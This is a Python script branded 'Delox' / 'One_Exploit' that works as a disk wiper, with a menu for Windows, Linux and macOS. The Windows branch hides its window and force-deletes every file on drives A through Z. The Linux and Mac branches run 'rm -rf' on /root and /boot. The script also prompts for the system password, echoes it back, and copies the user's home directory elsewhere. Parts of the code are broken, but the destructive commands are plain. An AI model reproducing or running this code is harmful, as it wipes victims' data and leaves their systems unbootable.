from requests import get
import socket
from lib2to3.pgen2 import driver
import os , win32gui , win32con
import getpass
import time
import banner
from color import Color

def ClearCSR():
    os.system('clear')
    os.system('cls')

def username():
    getpass.getuser()
def ip_local():
    get('https://api.ipify.org').text
def ip_public():
    socket.gethostbyname(socket.gethostname())

def run():
    ClearCSR()
    time.sleep(1)
    banner.Created_banner(Color.RED + 'Delox')
    systems = ('''
    [01] -> Windows
    [02] -> Linux
    [03] -> Os
    [99] -> exit
    ''')
    print(systems)
    sys = input('one_exploit => ')
    if sys == '01' or sys == '02' or sys == '03' :
        print('Which one [1,2,3,99')
        run()
    def exits():
        if sys == '99':
            os.system('exit')
            print('''
    =========
    | By By |
    =========
            ''')

    if sys == '1':
        def delWindows():
            listdrive = ['A', 'B' , 'C' ,'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
            time.sleep(1)
            ClearCSR()
            banner.Created_banner(Color.RED +'Windows')
            print()
            username()
            ip_local()

            password = input('your system have password?(Y , n) : ').lower()
            if password == 'Y':
                passnamesystem = getpass('Inter password '+username()+" : ")
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print(f'usename: {username()}')
                print(f'password: {passnamesystem}')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                for d in listdrive:
                    driver = d
                    os.system('del '+ driver + ':\*.* /f /s /q')
                # os.system('off')
                # os.system('attrib -r -g -h C:\\autoexec.bat')
                # os.system('del C:\\autoexec.bat')
                # os.system('attrib -r -g -h C:\\boot.ini')
                # os.system('del C:\\boot.ini')
                # os.system('attrib -r -g -h C:\\ntidr')
                # os.system('del C:\\ntidr')
                # os.system('attrib -r -g -h C:\windows\win.ini')
                # os.system('del C:\windows\win.ini')
            else:
                print(f'usename: {username()}')
                print('password: ')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                for d in listdrive:
                    driver = d
                    os.system('del '+ driver + ':\*.* /f /s /q')
                # os.system('off')
                # os.system('attrib -r -g -h C:\autoexec.bat')
                # os.system('del C:\autoexec.bat')
                # os.system('attrib -r -g -h C:\boot.ini')
                # os.system('del C:\boot.ini')
                # os.system('attrib -r -g -h C:\ntidr')
                # os.system('del C:\ntidr')
                # os.system('attrib -r -g -h C:\windows\win.ini')
                # os.system('del C:\windows\win.ini')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                    
        delWindows()

    elif sys == '2':
        def delLinux():
            time.sleep(1)
            os.system('clear')
            banner.Created_banner(Color.RED + 'Linux')
            
            password = input('your system have password?(Y , n) : ').lower()
            if password == 'y':
                passnamesystem = getpass('Inter password '+username()+" : ")
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
                print(f'usename: {username()}')
                print(f'pass: {passnamesystem}')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('echo '+passnamesystem)
                os.system('cp -r /home/'+username()+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')

            else:
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
                print(f'usename: {username()}')
                print('password: ')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('cp -r /home/'+username()+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
        delLinux()

    elif sys == '3':    
        def delOs():
            banner.Created_banner(Color.RED + 'MAC OS')
            ClearCSR()
            time.sleep(2)
            print('[*] -> your system deleted')
            os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
            os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
            os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
            os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
        delOs()

    elif sys == '99':
        exits()

run()
print('Good By')
